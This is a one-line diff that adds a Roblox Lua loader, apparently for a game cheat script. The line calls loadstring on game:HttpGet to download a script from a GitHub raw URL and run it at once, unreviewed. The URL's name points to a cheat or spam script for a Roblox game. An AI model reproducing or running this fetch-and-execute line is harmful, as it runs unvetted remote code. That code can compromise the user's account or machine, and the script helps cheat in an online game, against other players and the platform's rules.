@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/build-a-base-steal-plants-co-op-spam7-oyhd2kgfi911ci.lua"))()
